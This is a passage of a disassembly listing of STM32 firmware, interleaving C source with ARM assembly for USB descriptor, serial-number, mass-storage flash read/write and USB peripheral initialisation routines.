  return USBD_StrDesc;
 800c584:	4b02      	ldr	r3, [pc, #8]	; (800c590 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c586:	4618      	mov	r0, r3
 800c588:	3708      	adds	r7, #8
 800c58a:	46bd      	mov	sp, r7
 800c58c:	bd80      	pop	{r7, pc}
 800c58e:	bf00      	nop
 800c590:	2000097c 	.word	0x2000097c
 800c594:	0800d150 	.word	0x0800d150

0800c598 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c598:	b480      	push	{r7}
 800c59a:	b083      	sub	sp, #12
 800c59c:	af00      	add	r7, sp, #0
 800c59e:	4603      	mov	r3, r0
 800c5a0:	6039      	str	r1, [r7, #0]
 800c5a2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c5a4:	683b      	ldr	r3, [r7, #0]
 800c5a6:	220c      	movs	r2, #12
 800c5a8:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c5aa:	4b03      	ldr	r3, [pc, #12]	; (800c5b8 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c5ac:	4618      	mov	r0, r3
 800c5ae:	370c      	adds	r7, #12
 800c5b0:	46bd      	mov	sp, r7
 800c5b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c5b6:	4770      	bx	lr
 800c5b8:	200001f4 	.word	0x200001f4

0800c5bc <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c5bc:	b580      	push	{r7, lr}
 800c5be:	b084      	sub	sp, #16
 800c5c0:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c5c2:	4b0f      	ldr	r3, [pc, #60]	; (800c600 <Get_SerialNum+0x44>)
 800c5c4:	681b      	ldr	r3, [r3, #0]
 800c5c6:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c5c8:	4b0e      	ldr	r3, [pc, #56]	; (800c604 <Get_SerialNum+0x48>)
 800c5ca:	681b      	ldr	r3, [r3, #0]
 800c5cc:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c5ce:	4b0e      	ldr	r3, [pc, #56]	; (800c608 <Get_SerialNum+0x4c>)
 800c5d0:	681b      	ldr	r3, [r3, #0]
 800c5d2:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c5d4:	68fa      	ldr	r2, [r7, #12]
 800c5d6:	687b      	ldr	r3, [r7, #4]
 800c5d8:	4413      	add	r3, r2
 800c5da:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c5dc:	68fb      	ldr	r3, [r7, #12]
 800c5de:	2b00      	cmp	r3, #0
 800c5e0:	d009      	beq.n	800c5f6 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c5e2:	2208      	movs	r2, #8
 800c5e4:	4909      	ldr	r1, [pc, #36]	; (800c60c <Get_SerialNum+0x50>)
 800c5e6:	68f8      	ldr	r0, [r7, #12]
 800c5e8:	f000 f814 	bl	800c614 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c5ec:	2204      	movs	r2, #4
 800c5ee:	4908      	ldr	r1, [pc, #32]	; (800c610 <Get_SerialNum+0x54>)
 800c5f0:	68b8      	ldr	r0, [r7, #8]
 800c5f2:	f000 f80f 	bl	800c614 <IntToUnicode>
  }
}
 800c5f6:	bf00      	nop
 800c5f8:	3710      	adds	r7, #16
 800c5fa:	46bd      	mov	sp, r7
 800c5fc:	bd80      	pop	{r7, pc}
 800c5fe:	bf00      	nop
 800c600:	1fff7590 	.word	0x1fff7590
 800c604:	1fff7594 	.word	0x1fff7594
 800c608:	1fff7598 	.word	0x1fff7598
 800c60c:	20000206 	.word	0x20000206
 800c610:	20000216 	.word	0x20000216

0800c614 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c614:	b480      	push	{r7}
 800c616:	b087      	sub	sp, #28
 800c618:	af00      	add	r7, sp, #0
 800c61a:	60f8      	str	r0, [r7, #12]
 800c61c:	60b9      	str	r1, [r7, #8]
 800c61e:	4613      	mov	r3, r2
 800c620:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c622:	2300      	movs	r3, #0
 800c624:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c626:	2300      	movs	r3, #0
 800c628:	75fb      	strb	r3, [r7, #23]
 800c62a:	e027      	b.n	800c67c <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c62c:	68fb      	ldr	r3, [r7, #12]
 800c62e:	0f1b      	lsrs	r3, r3, #28
 800c630:	2b09      	cmp	r3, #9
 800c632:	d80b      	bhi.n	800c64c <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c634:	68fb      	ldr	r3, [r7, #12]
 800c636:	0f1b      	lsrs	r3, r3, #28
 800c638:	b2da      	uxtb	r2, r3
 800c63a:	7dfb      	ldrb	r3, [r7, #23]
 800c63c:	005b      	lsls	r3, r3, #1
 800c63e:	4619      	mov	r1, r3
 800c640:	68bb      	ldr	r3, [r7, #8]
 800c642:	440b      	add	r3, r1
 800c644:	3230      	adds	r2, #48	; 0x30
 800c646:	b2d2      	uxtb	r2, r2
 800c648:	701a      	strb	r2, [r3, #0]
 800c64a:	e00a      	b.n	800c662 <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c64c:	68fb      	ldr	r3, [r7, #12]
 800c64e:	0f1b      	lsrs	r3, r3, #28
 800c650:	b2da      	uxtb	r2, r3
 800c652:	7dfb      	ldrb	r3, [r7, #23]
 800c654:	005b      	lsls	r3, r3, #1
 800c656:	4619      	mov	r1, r3
 800c658:	68bb      	ldr	r3, [r7, #8]
 800c65a:	440b      	add	r3, r1
 800c65c:	3237      	adds	r2, #55	; 0x37
 800c65e:	b2d2      	uxtb	r2, r2
 800c660:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c662:	68fb      	ldr	r3, [r7, #12]
 800c664:	011b      	lsls	r3, r3, #4
 800c666:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c668:	7dfb      	ldrb	r3, [r7, #23]
 800c66a:	005b      	lsls	r3, r3, #1
 800c66c:	3301      	adds	r3, #1
 800c66e:	68ba      	ldr	r2, [r7, #8]
 800c670:	4413      	add	r3, r2
 800c672:	2200      	movs	r2, #0
 800c674:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c676:	7dfb      	ldrb	r3, [r7, #23]
 800c678:	3301      	adds	r3, #1
 800c67a:	75fb      	strb	r3, [r7, #23]
 800c67c:	7dfa      	ldrb	r2, [r7, #23]
 800c67e:	79fb      	ldrb	r3, [r7, #7]
 800c680:	429a      	cmp	r2, r3
 800c682:	d3d3      	bcc.n	800c62c <IntToUnicode+0x18>
  }
}
 800c684:	bf00      	nop
 800c686:	bf00      	nop
 800c688:	371c      	adds	r7, #28
 800c68a:	46bd      	mov	sp, r7
 800c68c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c690:	4770      	bx	lr

0800c692 <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c692:	b480      	push	{r7}
 800c694:	b083      	sub	sp, #12
 800c696:	af00      	add	r7, sp, #0
 800c698:	4603      	mov	r3, r0
 800c69a:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c69c:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c69e:	4618      	mov	r0, r3
 800c6a0:	370c      	adds	r7, #12
 800c6a2:	46bd      	mov	sp, r7
 800c6a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6a8:	4770      	bx	lr

0800c6aa <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c6aa:	b480      	push	{r7}
 800c6ac:	b085      	sub	sp, #20
 800c6ae:	af00      	add	r7, sp, #0
 800c6b0:	4603      	mov	r3, r0
 800c6b2:	60b9      	str	r1, [r7, #8]
 800c6b4:	607a      	str	r2, [r7, #4]
 800c6b6:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c6b8:	68bb      	ldr	r3, [r7, #8]
 800c6ba:	2240      	movs	r2, #64	; 0x40
 800c6bc:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c6be:	687b      	ldr	r3, [r7, #4]
 800c6c0:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c6c4:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c6c6:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c6c8:	4618      	mov	r0, r3
 800c6ca:	3714      	adds	r7, #20
 800c6cc:	46bd      	mov	sp, r7
 800c6ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6d2:	4770      	bx	lr

0800c6d4 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c6d4:	b480      	push	{r7}
 800c6d6:	b083      	sub	sp, #12
 800c6d8:	af00      	add	r7, sp, #0
 800c6da:	4603      	mov	r3, r0
 800c6dc:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c6de:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c6e0:	4618      	mov	r0, r3
 800c6e2:	370c      	adds	r7, #12
 800c6e4:	46bd      	mov	sp, r7
 800c6e6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6ea:	4770      	bx	lr

0800c6ec <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c6ec:	b480      	push	{r7}
 800c6ee:	b083      	sub	sp, #12
 800c6f0:	af00      	add	r7, sp, #0
 800c6f2:	4603      	mov	r3, r0
 800c6f4:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c6f6:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c6f8:	4618      	mov	r0, r3
 800c6fa:	370c      	adds	r7, #12
 800c6fc:	46bd      	mov	sp, r7
 800c6fe:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c702:	4770      	bx	lr

0800c704 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c704:	b580      	push	{r7, lr}
 800c706:	b084      	sub	sp, #16
 800c708:	af00      	add	r7, sp, #0
 800c70a:	60b9      	str	r1, [r7, #8]
 800c70c:	607a      	str	r2, [r7, #4]
 800c70e:	461a      	mov	r2, r3
 800c710:	4603      	mov	r3, r0
 800c712:	73fb      	strb	r3, [r7, #15]
 800c714:	4613      	mov	r3, r2
 800c716:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c718:	7bfb      	ldrb	r3, [r7, #15]
 800c71a:	2b00      	cmp	r3, #0
 800c71c:	d10d      	bne.n	800c73a <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c71e:	687b      	ldr	r3, [r7, #4]
 800c720:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c724:	3340      	adds	r3, #64	; 0x40
 800c726:	02db      	lsls	r3, r3, #11
 800c728:	4619      	mov	r1, r3
 800c72a:	89bb      	ldrh	r3, [r7, #12]
 800c72c:	02db      	lsls	r3, r3, #11
 800c72e:	461a      	mov	r2, r3
 800c730:	68b8      	ldr	r0, [r7, #8]
 800c732:	f000 fc65 	bl	800d000 <memcpy>
		return (USBD_OK);
 800c736:	2300      	movs	r3, #0
 800c738:	e000      	b.n	800c73c <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c73a:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c73c:	4618      	mov	r0, r3
 800c73e:	3710      	adds	r7, #16
 800c740:	46bd      	mov	sp, r7
 800c742:	bd80      	pop	{r7, pc}

0800c744 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c744:	b580      	push	{r7, lr}
 800c746:	b08a      	sub	sp, #40	; 0x28
 800c748:	af00      	add	r7, sp, #0
 800c74a:	60b9      	str	r1, [r7, #8]
 800c74c:	607a      	str	r2, [r7, #4]
 800c74e:	461a      	mov	r2, r3
 800c750:	4603      	mov	r3, r0
 800c752:	73fb      	strb	r3, [r7, #15]
 800c754:	4613      	mov	r3, r2
 800c756:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c758:	7bfb      	ldrb	r3, [r7, #15]
 800c75a:	2b00      	cmp	r3, #0
 800c75c:	d136      	bne.n	800c7cc <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c75e:	f7f4 febb 	bl	80014d8 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c762:	2300      	movs	r3, #0
 800c764:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c766:	2301      	movs	r3, #1
 800c768:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c76a:	687b      	ldr	r3, [r7, #4]
 800c76c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c770:	3340      	adds	r3, #64	; 0x40
 800c772:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c776:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c778:	89bb      	ldrh	r3, [r7, #12]
 800c77a:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c77c:	2300      	movs	r3, #0
 800c77e:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c780:	f107 0210 	add.w	r2, r7, #16
 800c784:	f107 0314 	add.w	r3, r7, #20
 800c788:	4611      	mov	r1, r2
 800c78a:	4618      	mov	r0, r3
 800c78c:	f7f4 ff8a 	bl	80016a4 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c790:	2300      	movs	r3, #0
 800c792:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c794:	e011      	b.n	800c7ba <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c796:	687b      	ldr	r3, [r7, #4]
 800c798:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c79c:	3340      	adds	r3, #64	; 0x40
 800c79e:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7a0:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7a2:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c7a4:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7a6:	68ba      	ldr	r2, [r7, #8]
 800c7a8:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7aa:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c7ae:	2000      	movs	r0, #0
 800c7b0:	f7f4 fe26 	bl	8001400 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7b4:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7b6:	3308      	adds	r3, #8
 800c7b8:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7ba:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c7bc:	89bb      	ldrh	r3, [r7, #12]
 800c7be:	02db      	lsls	r3, r3, #11
 800c7c0:	429a      	cmp	r2, r3
 800c7c2:	d3e8      	bcc.n	800c796 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c7c4:	f7f4 feaa 	bl	800151c <HAL_FLASH_Lock>
		return USBD_OK;
 800c7c8:	2300      	movs	r3, #0
 800c7ca:	e000      	b.n	800c7ce <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c7cc:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c7ce:	4618      	mov	r0, r3
 800c7d0:	3728      	adds	r7, #40	; 0x28
 800c7d2:	46bd      	mov	sp, r7
 800c7d4:	bd80      	pop	{r7, pc}

0800c7d6 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c7d6:	b480      	push	{r7}
 800c7d8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c7da:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c7dc:	4618      	mov	r0, r3
 800c7de:	46bd      	mov	sp, r7
 800c7e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c7e4:	4770      	bx	lr
	...

0800c7e8 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c7e8:	b580      	push	{r7, lr}
 800c7ea:	b098      	sub	sp, #96	; 0x60
 800c7ec:	af00      	add	r7, sp, #0
 800c7ee:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c7f0:	f107 030c 	add.w	r3, r7, #12
 800c7f4:	2254      	movs	r2, #84	; 0x54
 800c7f6:	2100      	movs	r1, #0
 800c7f8:	4618      	mov	r0, r3
 800c7fa:	f000 fbd5 	bl	800cfa8 <memset>
  if(pcdHandle->Instance==USB)
 800c7fe:	687b      	ldr	r3, [r7, #4]
 800c800:	681b      	ldr	r3, [r3, #0]
 800c802:	4a1d      	ldr	r2, [pc, #116]	; (800c878 <HAL_PCD_MspInit+0x90>)
 800c804:	4293      	cmp	r3, r2
 800c806:	d132      	bne.n	800c86e <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c808:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c80c:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c80e:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c812:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c814:	2301      	movs	r3, #1
 800c816:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c818:	2301      	movs	r3, #1
 800c81a:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c81c:	2318      	movs	r3, #24
 800c81e:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c820:	2307      	movs	r3, #7
 800c822:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c824:	2302      	movs	r3, #2
 800c826:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c828:	2302      	movs	r3, #2
 800c82a:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c82c:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c830:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c832:	f107 030c 	add.w	r3, r7, #12
 800c836:	4618      	mov	r0, r3
 800c838:	f7f7 fe5c 	bl	80044f4 <HAL_RCCEx_PeriphCLKConfig>
 800c83c:	4603      	mov	r3, r0
 800c83e:	2b00      	cmp	r3, #0
 800c840:	d001      	beq.n	800c846 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c842:	f7f4 fa03 	bl	8000c4c <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c846:	4b0d      	ldr	r3, [pc, #52]	; (800c87c <HAL_PCD_MspInit+0x94>)
 800c848:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c84a:	4a0c      	ldr	r2, [pc, #48]	; (800c87c <HAL_PCD_MspInit+0x94>)
 800c84c:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c850:	6593      	str	r3, [r2, #88]	; 0x58
 800c852:	4b0a      	ldr	r3, [pc, #40]	; (800c87c <HAL_PCD_MspInit+0x94>)
 800c854:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c856:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c85a:	60bb      	str	r3, [r7, #8]
 800c85c:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c85e:	2200      	movs	r2, #0
 800c860:	2100      	movs	r1, #0
 800c862:	2043      	movs	r0, #67	; 0x43
 800c864:	f7f4 fd95 	bl	8001392 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c868:	2043      	movs	r0, #67	; 0x43
 800c86a:	f7f4 fdae 	bl	80013ca <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c86e:	bf00      	nop
 800c870:	3760      	adds	r7, #96	; 0x60
 800c872:	46bd      	mov	sp, r7
 800c874:	bd80      	pop	{r7, pc}
 800c876:	bf00      	nop
 800c878:	40006800 	.word	0x40006800
 800c87c:	40021000 	.word	0x40021000

0800c880 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c880:	b580      	push	{r7, lr}
 800c882:	b082      	sub	sp, #8
 800c884:	af00      	add	r7, sp, #0
 800c886:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c888:	687b      	ldr	r3, [r7, #4]
 800c88a:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c88e:	687b      	ldr	r3, [r7, #4]
 800c890:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c894:	4619      	mov	r1, r3
 800c896:	4610      	mov	r0, r2
 800c898:	f7fe fb70 	bl	800af7c <USBD_LL_SetupStage>
}
 800c89c:	bf00      	nop
 800c89e:	3708      	adds	r7, #8
 800c8a0:	46bd      	mov	sp, r7
 800c8a2:	bd80      	pop	{r7, pc}

0800c8a4 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8a4:	b580      	push	{r7, lr}
 800c8a6:	b082      	sub	sp, #8
 800c8a8:	af00      	add	r7, sp, #0
 800c8aa:	6078      	str	r0, [r7, #4]
 800c8ac:	460b      	mov	r3, r1
 800c8ae:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c8b0:	687b      	ldr	r3, [r7, #4]
 800c8b2:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8b6:	78fa      	ldrb	r2, [r7, #3]
 800c8b8:	6879      	ldr	r1, [r7, #4]
 800c8ba:	4613      	mov	r3, r2
 800c8bc:	009b      	lsls	r3, r3, #2
 800c8be:	4413      	add	r3, r2
 800c8c0:	00db      	lsls	r3, r3, #3
 800c8c2:	440b      	add	r3, r1
 800c8c4:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c8c8:	681a      	ldr	r2, [r3, #0]
 800c8ca:	78fb      	ldrb	r3, [r7, #3]
 800c8cc:	4619      	mov	r1, r3
 800c8ce:	f7fe fbaa 	bl	800b026 <USBD_LL_DataOutStage>
}
 800c8d2:	bf00      	nop
 800c8d4:	3708      	adds	r7, #8
 800c8d6:	46bd      	mov	sp, r7
 800c8d8:	bd80      	pop	{r7, pc}

0800c8da <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8da:	b580      	push	{r7, lr}
 800c8dc:	b082      	sub	sp, #8
 800c8de:	af00      	add	r7, sp, #0
 800c8e0:	6078      	str	r0, [r7, #4]
 800c8e2:	460b      	mov	r3, r1
 800c8e4:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c8e6:	687b      	ldr	r3, [r7, #4]
 800c8e8:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8ec:	78fa      	ldrb	r2, [r7, #3]
 800c8ee:	6879      	ldr	r1, [r7, #4]
 800c8f0:	4613      	mov	r3, r2
 800c8f2:	009b      	lsls	r3, r3, #2
 800c8f4:	4413      	add	r3, r2
 800c8f6:	00db      	lsls	r3, r3, #3
 800c8f8:	440b      	add	r3, r1
 800c8fa:	333c      	adds	r3, #60	; 0x3c
 800c8fc:	681a      	ldr	r2, [r3, #0]
 800c8fe:	78fb      	ldrb	r3, [r7, #3]
 800c900:	4619      	mov	r1, r3
 800c902:	f7fe fc43 	bl	800b18c <USBD_LL_DataInStage>
}
 800c906:	bf00      	nop
 800c908:	3708      	adds	r7, #8
 800c90a:	46bd      	mov	sp, r7
 800c90c:	bd80      	pop	{r7, pc}

0800c90e <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c90e:	b580      	push	{r7, lr}
 800c910:	b082      	sub	sp, #8
 800c912:	af00      	add	r7, sp, #0
 800c914:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800c916:	687b      	ldr	r3, [r7, #4]
 800c918:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c91c:	4618      	mov	r0, r3
 800c91e:	f7fe fd7d 	bl	800b41c <USBD_LL_SOF>
}
 800c922:	bf00      	nop
 800c924:	3708      	adds	r7, #8
 800c926:	46bd      	mov	sp, r7
 800c928:	bd80      	pop	{r7, pc}

0800c92a <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c92a:	b580      	push	{r7, lr}
 800c92c:	b084      	sub	sp, #16
 800c92e:	af00      	add	r7, sp, #0
 800c930:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c932:	2301      	movs	r3, #1
